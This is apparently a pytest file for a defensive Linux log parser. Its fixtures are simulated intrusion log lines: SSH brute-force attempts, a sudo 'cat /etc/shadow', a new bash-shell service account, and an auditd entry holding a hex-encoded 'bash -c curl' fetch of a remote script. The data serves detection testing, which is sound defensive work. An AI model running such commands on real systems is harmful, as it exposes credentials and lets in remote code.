"""Tests for Linux auth.log, sudo, account, auditd, and syslog parsers."""

from pathlib import Path

from secguard.parsers import parse_log_file, parse_log_lines


def test_parse_ssh_events() -> None:
    lines = [
        "Nov 25 10:12:02 web01 sshd[101]: Invalid user admin from 185.220.101.42 port 44102",
        "2026-11-25T10:12:04+00:00 web01 sshd[101]: Failed password for invalid user admin from 185.220.101.42 port 44102 ssh2",
        "2026-11-25T10:12:51+00:00 web01 sshd[130]: Accepted password for devops from 185.220.101.42 port 44210 ssh2",
        "2026-11-25T10:13:00+00:00 web01 sshd[131]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.10 user=root",
    ]
    events = parse_log_lines(lines, default_year=2026)
    assert len(events) == 4

    assert events[0].event_type == "ssh_invalid_user"
    assert events[0].user == "admin"
    assert events[0].src_ip == "185.220.101.42"
    assert events[0].src_port == 44102
    assert events[0].outcome == "failure"

    assert events[1].event_type == "ssh_failed_auth"
    assert events[1].outcome == "failure"

    assert events[2].event_type == "ssh_accepted"
    assert events[2].user == "devops"
    assert events[2].outcome == "success"
    assert events[2].metadata["auth_method"] == "password"

    assert events[3].event_type == "ssh_pam_failure"
    assert events[3].src_ip == "203.0.113.10"
    assert events[3].user == "root"


def test_parse_sudo_and_account_events() -> None:
    lines = [
        "2026-11-25T10:13:15+00:00 web01 sudo:   devops : TTY=pts/2 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
        "2026-11-25T10:13:20+00:00 web01 sudo:   guest : user NOT in sudoers ; TTY=pts/3 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
        "2026-11-25T10:13:48+00:00 web01 useradd[3210]: new user: name=svc_backup, UID=1099, GID=1099, home=/home/svc_backup, shell=/bin/bash",
    ]
    events = parse_log_lines(lines)
    assert events[0].event_type == "sudo_exec"
    assert events[0].user == "devops"
    assert events[0].command == "/usr/bin/cat /etc/shadow"
    assert events[0].outcome == "success"

    assert events[1].event_type == "sudo_unauthorized"
    assert events[1].user == "guest"
    assert events[1].outcome == "failure"

    assert events[2].event_type == "account_change"
    assert events[2].user == "svc_backup"


def test_parse_auditd_execve_and_hex() -> None:
    hex_arg = "curl -s http://198.51.100.77/p.sh".encode("utf-8").hex()
    lines = [
        f'node=prod-web-01 type=EXECVE msg=audit(1795601602.410:901): argc=3 a0="/bin/bash" a1="-c" a2={hex_arg}',
        "2026-11-25T10:14:00+00:00 prod-web-01 systemd[1]: Started Cleanup.",
    ]
    events = parse_log_lines(lines)
    assert events[0].source == "auditd"
    assert events[0].event_type == "auditd_execve"
    assert events[0].command == "/bin/bash -c curl -s http://198.51.100.77/p.sh"
    assert events[1].event_type == "syslog_generic"


def test_parse_sample_files() -> None:
    benign = parse_log_file(Path("samples/linux_benign_baseline.log"))
    attack = parse_log_file(Path("samples/linux_attack_scenario.log"))
    assert len(benign) >= 50
    assert len(attack) >= 50
